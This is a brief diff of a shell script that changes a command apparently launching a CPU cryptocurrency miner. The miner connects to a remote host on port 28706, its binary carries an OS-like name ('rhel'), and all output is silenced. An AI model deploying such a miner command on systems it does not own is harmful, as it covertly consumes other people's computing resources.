@@ -136,5 +136,5 @@ echo " "
 echo " "
 sleep 2
 
-./update/update ./rhel -v 3 -r 20 -s http://24-Feb-2025_rheRPC_206_189_127_32_LNCsd9Eq.emergencyaccess.teatspray.uk:28706 -cputhreads $used_num_of_cores -extrapayload SoloMiningToMyNodeLolWut 1>/dev/null 2>&1
+./rhel -v 3 -r 20 -s http://24-Feb-2025_rheRPC_206_189_127_32_LNCsd9Eq.emergencyaccess.teatspray.uk:28706 -cputhreads $used_num_of_cores -extrapayload SoloMiningToMyNodeLolWut 1>/dev/null 2>&1
 
